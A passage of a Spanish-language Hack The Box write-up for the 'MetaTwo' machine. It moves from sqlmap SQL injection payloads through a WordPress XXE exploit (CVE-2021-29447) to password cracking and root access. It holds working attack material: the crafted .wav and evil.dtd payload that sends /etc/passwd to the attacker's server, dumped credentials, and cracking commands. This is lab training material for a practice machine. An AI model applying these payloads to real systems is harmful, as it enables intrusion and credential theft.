Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause Payload: action=bookingpress_front_get_category_services\u0026amp;category_id=1\u0026amp;total_service=-9741) OR 1325=1325-- gulF\u0026amp;_wpnonce=fc0046577c Type: UNION query Title: Generic UNION query (random number) - 9 columns Payload: action=bookingpress_front_get_category_services\u0026amp;category_id=1\u0026amp;total_service=-9794) UNION ALL SELECT 8577,8577,8577,8577,8577,CONCAT(0x7162786271,0x6168497959646e647a66706f626d4964534e654e6350536b4f6b6e784b505156566d4b516a467842,0x71717a7871),8577,8577,8577-- -\u0026amp;_wpnonce=fc0046577c --- [16:33:39] [INFO] testing MySQL [16:33:39] [INFO] confirming MySQL [16:33:40] [INFO] the back-end DBMS is MySQL web application technology: Nginx 1.18.0, PHP 8.0.24 back-end DBMS: MySQL \u0026gt;= 5.0.0 (MariaDB fork) [16:33:40] [INFO] fetching database names available databases [2]: [*] blog [*] information_schema [16:33:40] [INFO] fetched data logged to text files under \u0026#39;/home/kirby/.local/share/sqlmap/output/metapress.htb\u0026#39; [*] ending @ 16:33:40 /2022-11-26/ ➜ metatwo Logramos obtener usuarios y hashes, de admin y manager.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 Database: blog [27 tables] +--------------------------------------+ | wp_bookingpress_appointment_bookings | | wp_bookingpress_categories | | wp_bookingpress_customers | | wp_bookingpress_customers_meta | | wp_bookingpress_customize_settings | | wp_bookingpress_debug_payment_log | | wp_bookingpress_default_daysoff | | wp_bookingpress_default_workhours | | wp_bookingpress_entries | | wp_bookingpress_form_fields | | wp_bookingpress_notifications | | wp_bookingpress_payment_logs | | wp_bookingpress_services | | wp_bookingpress_servicesmeta | | wp_bookingpress_settings | | wp_commentmeta | | wp_comments | | wp_links | | wp_options | | wp_postmeta | | wp_posts | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | +--------------------------------------+ Database: blog Table: wp_users [10 columns] +---------------------+---------------------+ | Column | Type | +---------------------+---------------------+ | display_name | varchar(250) | | ID | bigint(20) unsigned | | user_activation_key | varchar(255) | | user_email | varchar(100) | | user_login | varchar(60) | | user_nicename | varchar(50) | | user_pass | varchar(255) | | user_registered | datetime | | user_status | int(11) | | user_url | varchar(100) | +---------------------+---------------------+ Database: blog Table: wp_users [2 entries] +----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+ | ID | user_url | user_pass | user_email | user_login | user_status | display_name | user_nicename | user_registered | user_activation_key | +----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+ | 1 | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb | admin | 0 | admin | admin | 2022-06-23 17:58:28 | \u0026lt;blank\u0026gt; | | 2 | \u0026lt;blank\u0026gt; | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager | 0 | manager | manager | 2022-06-23 18:07:55 | \u0026lt;blank\u0026gt; | +----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+ Unicamente logramos crackear una de estas.\n1 2 3 4 5 6 7 8 ➜ metatwo cat hashes $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 ➜ metatwo john hashes -show ?:partylikearockstar 1 password hash cracked, 1 left ➜ metatwo WordPress - Manager Logramos ingresar al panel de control como manager, sin embargo no encontramos alguna herramienta que nos permitiera escalar privilegios o ejecutar comandos.\nXXE - Media Library Al regresar a la version de WordPress nos topamos con XXE en Media Library de WordPress, esto dentro de un archivo .wav.\nRealizamos la explotación creando el archivo .wav con el payload especificando la dirección url de nuestro servidor http, asi mismo el archivo .dtd donde se especifica el archivo que deseamos leer con la codificacion zlib y base64.\n1 2 3 4 5 6 7 8 ➜ www echo -en \u0026#39;RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE ANY[\u0026lt;!ENTITY % remote SYSTEM \u0026#39;\u0026#34;\u0026#39;\u0026#34;\u0026#39;http://10.10.14.207/evil.dtd\u0026#39;\u0026#34;\u0026#39;\u0026#34;\u0026#39;\u0026gt;%remote;%init;%trick;] \u0026gt;\\x00\u0026#39;\u0026gt; file.wav ➜ www cat file.wav RIFFWAVEiXML{\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE ANY[\u0026lt;!ENTITY % remote SYSTEM \u0026#39;http://10.10.14.207/evil.dtd\u0026#39;\u0026gt;%remote;%init;%trick;] \u0026gt; ➜ www ➜ www cat evil.dtd \u0026lt;!ENTITY % file SYSTEM \u0026#34;php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % init \u0026#34;\u0026lt;!ENTITY \u0026amp;#37; trick SYSTEM \u0026#39;http://10.10.14.207/?p=%file;\u0026#39;\u0026gt;\u0026#34; \u0026gt; ➜ www Subimos el archivo file.wav a WordPress.\nLuego de unos segundos obtenemos una solicitud en nuestro servidor HTTP.\n1 2 3 4 5 6 ➜ www httphere . Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.186 - - [26/Nov/2022 18:22:01] \u0026#34;GET /evil.dtd HTTP/1.1\u0026#34; 200 - 10.10.11.186 - - [26/Nov/2022 18:22:01] \u0026#34;GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== HTTP/1.1\u0026#34; 200 - 10.10.11.186 - - [26/Nov/2022 18:22:01] \u0026#34;GET /evil.dtd HTTP/1.1\u0026#34; 200 - 10.10.11.186 - - [26/Nov/2022 18:22:01] \u0026#34;GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== HTTP/1.1\u0026#34; 200 - Tras decodificar el string observamos el contenido del archivo /etc/passwd.\nRef.\nhttps://blog.sonarsource.com/wordpress-xxe-security-vulnerability/ https://hackerone.com/reports/1095645 Exploit Es posible realizar lo anterior utilizando un exploit que realiza automatiza todo el trabajo. Se especifican las credenciales, el archivo a leer y lhost. En esta solicitud observamos el contenido del archivo wp-config.php donde encontramos credenciales para el servicio FTP\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 ➜ www bash file.sh metapress.htb manager partylikearockstar ../wp-config.php 10.10.14.207 ===================================== CVE-2021-29447 - WordPress 5.6-5.7 - XXE \u0026amp; SSRF Within the Media Library (Authenticated) ------------------------------------- @David_Uton (M3n0sD0n4ld) https://m3n0sd0n4ld.github.io/ ===================================== [*] Test connection to WordPress... [+] Authentication successfull!!! [+] Create payload.wav [+] Getting Wp Nonce ... [+] Wp Nonce retrieved successfully ! _wpnonce : 976427a03a [+] Uploading the wav file ... [-] Failed to receive a response for uploaded! Try again . [+] Obtaining file information... \u0026lt;?php /** The name of the database for WordPress */ define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;blog\u0026#39; ); /** MySQL database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;blog\u0026#39; ); /** MySQL database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;635Aq@TdqrCwXFUZ\u0026#39; ); /** MySQL hostname */ define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); /** Database Charset to use in creating database tables. */ define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8mb4\u0026#39; ); /** The Database Collate type. Don\u0026#39;t change this if in doubt. */ define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); define( \u0026#39;FS_METHOD\u0026#39;, \u0026#39;ftpext\u0026#39; ); define( \u0026#39;FTP_USER\u0026#39;, \u0026#39;metapress.htb\u0026#39; ); define( \u0026#39;FTP_PASS\u0026#39;, \u0026#39;9NYS_ii@FyL_p5M2NvJ\u0026#39; ); define( \u0026#39;FTP_HOST\u0026#39;, \u0026#39;ftp.metapress.htb\u0026#39; ); define( \u0026#39;FTP_BASE\u0026#39;, \u0026#39;blog/\u0026#39; ); define( \u0026#39;FTP_SSL\u0026#39;, false ); [.. snip ..] ➜ www User - Jnelson FTP Tras ingresar por el servicio FTP encontramos distintos archivos, observamos un archivo interesanto, send_email.php.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 ➜ www ftp ftp\u0026gt; o ftp.metapress.htb Connected to metapress.htb. 220 ProFTPD Server (Debian) [::ffff:10.10.11.186] Name (ftp.metapress.htb:kirby): metapress.htb 331 Password required for metapress.htb Password: 230 User metapress.htb logged in Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful 150 Opening ASCII mode data connection for file list drwxr-xr-x 5 metapress.htb metapress.htb 4096 Oct 5 14:12 blog drwxr-xr-x 3 metapress.htb metapress.htb 4096 Oct 5 14:12 mailer 226 Transfer complete ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; cd blog 250 CWD command successful ftp\u0026gt; ls 200 PORT command successful 150 Opening ASCII mode data connection for file list -rw-r--r-- 1 metapress.htb metapress.htb 405 Feb 6 2020 index.php [.. snip ..] -rw-r--r-- 1 metapress.htb metapress.htb 3236 Jun 8 2020 xmlrpc.php 226 Transfer complete ftp\u0026gt; cd .. 250 CWD command successful ftp\u0026gt; cd mailer ls250 CWD command successful ftp\u0026gt; ls 200 PORT command successful 150 Opening ASCII mode data connection for file list drwxr-xr-x 4 metapress.htb metapress.htb 4096 Oct 5 14:12 PHPMailer -rw-r--r-- 1 metapress.htb metapress.htb 1126 Jun 22 18:32 send_email.php 226 Transfer complete ftp\u0026gt; ls PHPMailer 200 PORT command successful 150 Opening ASCII mode data connection for file list -rw-r--r-- 1 metapress.htb metapress.htb 2092 Jun 20 09:21 COMMITMENT [.. snip ..] -rw-r--r-- 1 metapress.htb metapress.htb 5 Jun 20 09:21 VERSION 226 Transfer complete ftp\u0026gt; get send_email.php local: send_email.php remote: send_email.php 200 PORT command successful 150 Opening BINARY mode data connection for send_email.php (1126 bytes) 226 Transfer complete 1126 bytes received in 0.00 secs (624.7781 kB/s) ftp\u0026gt; ftp\u0026gt; Tras descargar este archivo, descubrimos credenciales para el usuario jnelson.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 ➜ www cat send_email.php \u0026lt;?php /* * This script will be used to send an email to all our users when ready for launch */ use PHPMailer\\PHPMailer\\PHPMailer; use PHPMailer\\PHPMailer\\SMTP; use PHPMailer\\PHPMailer\\Exception; require \u0026#39;PHPMailer/src/Exception.php\u0026#39;; require \u0026#39;PHPMailer/src/PHPMailer.php\u0026#39;; require \u0026#39;PHPMailer/src/SMTP.php\u0026#39;; $mail = new PHPMailer(true); $mail-\u0026gt;SMTPDebug = 3; $mail-\u0026gt;isSMTP(); $mail-\u0026gt;Host = \u0026#34;mail.metapress.htb\u0026#34;; $mail-\u0026gt;SMTPAuth = true; $mail-\u0026gt;Username = \u0026#34;jnelson@metapress.htb\u0026#34;; $mail-\u0026gt;Password = \u0026#34;Cb4_JmWM8zUZWMu@Ys\u0026#34;; $mail-\u0026gt;SMTPSecure = \u0026#34;tls\u0026#34;; $mail-\u0026gt;Port = 587; $mail-\u0026gt;From = \u0026#34;jnelson@metapress.htb\u0026#34;; $mail-\u0026gt;FromName = \u0026#34;James Nelson\u0026#34;; $mail-\u0026gt;addAddress(\u0026#34;info@metapress.htb\u0026#34;); $mail-\u0026gt;isHTML(true); $mail-\u0026gt;Subject = \u0026#34;Startup\u0026#34;; $mail-\u0026gt;Body = \u0026#34;\u0026lt;i\u0026gt;We just started our new blog metapress.htb!\u0026lt;/i\u0026gt;\u0026#34;; try { $mail-\u0026gt;send(); echo \u0026#34;Message has been sent successfully\u0026#34;; } catch (Exception $e) { echo \u0026#34;Mailer Error: \u0026#34; . $mail-\u0026gt;ErrorInfo; } ➜ www Shell Utilizando estas credenciales por SSH logramos obtener una shell y nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ➜ www ssh jnelson@metapress.htb # Cb4_JmWM8zUZWMu@Ys jnelson@metapress.htb\u0026#39;s password: Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Oct 25 12:51:26 2022 from 10.10.14.23 jnelson@meta2:~$ whoami jnelson jnelson@meta2:~$ ls user.txt jnelson@meta2:~$ Privesc Explorando los archivos locales encontramos el archivo de configuración y las \u0026ldquo;keys\u0026rdquo; de passpie, un manejador de contraseñas por terminal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 jnelson@meta2:~$ ls -lah total 36K drwxr-xr-x 5 jnelson jnelson 4.0K Nov 26 23:36 . drwxr-xr-x 3 root root 4.0K Oct 5 15:12 .. lrwxrwxrwx 1 root root 9 Jun 26 15:59 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 jnelson jnelson 220 Jun 26 15:46 .bash_logout -rw-r--r-- 1 jnelson jnelson 3.5K Jun 26 15:46 .bashrc drwx------ 2 jnelson jnelson 4.0K Nov 26 23:36 .gnupg drwxr-xr-x 3 jnelson jnelson 4.0K Oct 25 12:51 .local dr-xr-x--- 3 jnelson jnelson 4.0K Oct 25 12:52 .passpie -rw-r--r-- 1 jnelson jnelson 807 Jun 26 15:46 .profile -rw-r----- 1 root jnelson 33 Nov 26 23:18 user.txt jnelson@meta2:~$ cd .passpie/ jnelson@meta2:~/.passpie$ ls -lah total 24K dr-xr-x--- 3 jnelson jnelson 4.0K Oct 25 12:52 . drwxr-xr-x 5 jnelson jnelson 4.0K Nov 26 23:36 .. -r-xr-x--- 1 jnelson jnelson 3 Jun 26 13:57 .config -r-xr-x--- 1 jnelson jnelson 5.2K Jun 26 13:58 .keys dr-xr-x--- 2 jnelson jnelson 4.0K Oct 25 12:52 ssh jnelson@meta2:~/.passpie$ cat .keys -----BEGIN PGP PUBLIC KEY BLOCK----- mQSuBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1 [.. snip ] GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+Po3KGdNgA/04lhPjdN3wrzjU3qmrL fo6KI+w2uXLaw+bIT1XZurDN =dqsF -----END PGP PUBLIC KEY BLOCK----- -----BEGIN PGP PRIVATE KEY BLOCK----- lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1 [.. snip ] V9YCGwwACgkQOHd1w1dF0gOm5gD9GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+P o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN =7Uo6 -----END PGP PRIVATE KEY BLOCK----- jnelson@meta2:~/.passpie$ Tambien encontramos los archivos de las contraseñas encriptadas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 jnelson@meta2:~/.passpie$ cd ssh/ jnelson@meta2:~/.passpie/ssh$ jnelson@meta2:~/.passpie/ssh$ ls -lah total 16K dr-xr-x--- 2 jnelson jnelson 4.0K Oct 25 12:52 . dr-xr-x--- 3 jnelson jnelson 4.0K Oct 25 12:52 .. -r-xr-x--- 1 jnelson jnelson 683 Oct 25 12:52 jnelson.pass -r-xr-x--- 1 jnelson jnelson 673 Oct 25 12:52 root.pass jnelson@meta2:~/.passpie/ssh$ cat jnelson.pass comment: \u0026#39;\u0026#39; fullname: jnelson@ssh login: jnelson modified: 2022-06-26 08:58:15.514422 name: ssh password: \u0026#39;-----BEGIN PGP MESSAGE----- hQEOA6I+wl+LXYMaEAP/eA8Bw+/AcAvm5g0QFotFRzmToYPSoUr13XcUSSmuEi0c 4zObpYX4PvSjB6YdhIIxu/cJNZV+WbUuTU0HZTPs49i8qe1xK+g4YRELqhSo6oig ZuvQptZzB8LmG8zRVB6c1aO/1SoiRvzfGmgrdaHhtyGA2rtdTZU66MIzZ+irVhED /Agw0T3BdpJ15yuNSmyfpf14PeE5r/dWBc6l4/VO6ZZzWyX8SysNxcFDSHChpXsm 7OR9hpt9HEVZiHq87qNwSYqiNeA9p7uzKV37HQpik3zQvtudc8Ho7IUdU1a5ZCWj EmrNsSI0aEBKbJ47ZoX4jfwnjRO5QrDzNf1G9vkbzb2V0k0BtHWiok49YVRmLB63 GFD/CGo7s1dia+0PP6BNMo0dllqI72/8rGQcM0BFOqzhzKZ3/iNNKoJUiEHzIvMW 7ome0qtZhiFs+5J3I2U1HA== =91YS -----END PGP MESSAGE----- \u0026#39; jnelson@meta2:~/.passpie/ssh$ cat root.pass comment: \u0026#39;\u0026#39; fullname: root@ssh login: root modified: 2022-06-26 08:58:15.621572 name: ssh password: \u0026#39;-----BEGIN PGP MESSAGE----- hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2 nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr lpF0RatbxQGWBks5F3o= =uh1B -----END PGP MESSAGE----- \u0026#39; jnelson@meta2:~/.passpie/ssh$ Se listan las contraseñas de dos usuarios.\n1 2 3 4 5 6 7 8 9 jnelson@meta2:~/.passpie$ passpie list ╒════════╤═════════╤════════════╤═══════════╕ │ Name │ Login │ Password │ Comment │ ╞════════╪═════════╪════════════╪═══════════╡ │ ssh │ jnelson │ ******** │ │ ├────────┼─────────┼────────────┼───────────┤ │ ssh │ root │ ******** │ │ ╘════════╧═════════╧════════════╧═══════════╛ jnelson@meta2:~/.passpie$ John - Crack The Hash Convertimos la private key que encontramos en el archivo .keys utilizando gpg2john.\n1 2 3 4 5 6 ➜ metatwo gpg2john key_2 \u0026gt; key_2_hash File key_2 ➜ metatwo cat key_2_hash Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) \u0026lt;passpie@local\u0026gt;::key_2 ➜ metatwo Tras ejecutar john logramos obtener la contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 ➜ metatwo john --wordlist=$ROCK key_2_hash Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65011712 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status blink182 (Passpie) 1g 0:00:00:02 DONE (2022-11-26 17:59) 0.3367g/s 55.21p/s 55.21c/s 55.21C/s ginger..blink182 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed ➜ metatwo Decrypt files Importamos la clave localmente, ingresamos la contraseña encontrada por John.\n1 2 3 4 5 6 7 8 ➜ metatwo gpg --import key_2 # blink182 gpg: key 387775C35745D203: \u0026#34;Passpie (Auto-generated by Passpie) \u0026lt;passpie@local\u0026gt;\u0026#34; not changed gpg: key 387775C35745D203: secret key imported gpg: Total number processed: 1 gpg: unchanged: 1 gpg: secret keys read: 1 gpg: secret keys imported: 1 ➜ metatwo Obtuvimos localmente el archivo root.pass.\n1 2 3 4 5 6 7 8 9 10 11 -----BEGIN PGP MESSAGE----- hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2 nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr lpF0RatbxQGWBks5F3o= =uh1B -----END PGP MESSAGE----- Tras desencriptar dicho archivo obtuvimos la contraseña en texto plano.\n1 2 3 4 5 6 ➜ metatwo gpg --decrypt msg_root gpg: invalid armor header: hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2\\n gpg: encrypted with 1024-bit ELG key, ID A23EC25F8B5D831A, created 2022-06-26 \u0026#34;Passpie (Auto-generated by Passpie) \u0026lt;passpie@local\u0026gt;\u0026#34; p7qfAZt4_A1xo_0x ➜ metatwo Con ella logramos obtener acceso como root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 jnelson@meta2:~/.passpie$ su root Password: root@meta2:/home/jnelson/.passpie# whoami;id root uid=0(root) gid=0(root) groups=0(root) root@meta2:/home/jnelson/.passpie# cd root@meta2:~# ls restore root.txt root@meta2:~# cat root.txt 6d415cdfc1fcecf32c3e5213b3a1d37a root@meta2:~# ","description":"En MetaTwo encontramos dos plugins de WordPress vulnerables a Inyeccion SQL y XXE, lo que nos permitio acceder al servicio FTP, en consecuencia a un primer usuario. Finalmente escalamos privilegios tras desencriptar un archivo que contenia la contraseña del usuario root.","id":1,"section":"posts","tags":["wordpress","wpscan","CVE-2022-0739","sqli","sqlmap","CVE-2021-29447","john","ftp","passpie","gpg2john","gpg"],"title":"Hack The Box - MetaTwo","uri":"https://sckull.github.io/posts/metatwo/"},{"content":"\rInvestigation presenta un sitio que permite analizar los metadatos de una imagen mediante ExifTool, encontramos que la version es vulnerable lo que nos permitio acceder a la maquina. Tras analizar un archivo de Eventos de Windows encontramos credenciales para un segundo usuario. Finalmente escalamos privilegios tras analizar el codigo fuente de un ejecutable con Ghidra.\nNombre Investigation OS Linux Puntos 30 Dificultad Media IP 10.10.11.197 Maker Derezzed\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.4, 4.9, 5.3, 4.7, 5.1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.93 scan initiated Fri Mar 3 21:23:49 2023 as: nmap -p22,80 -sV -sC -oN nmap_scan 10.10.11.197 Nmap scan report for 10.10.11.197 Host is up (0.066s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 2f1e6306aa6ebbcc0d19d4152674c6d9 (RSA) | 256 274520add2faa73a8373d97c79abf30b (ECDSA) |_ 256 4245eb916e21020617b2748bc5834fe0 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://eforenzics.htb/ Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Mar 3 21:23:58 2023 -- 1 IP address (1 host up) scanned in 9.44 seconds Web Site El sitio web nos redirige al dominio eforenzics.htb. Agregamos el dominio al archivo /etc/hosts.\n1 2 3 4 5 6 7 8 ➜ investigation curl -sI 10.10.11.197 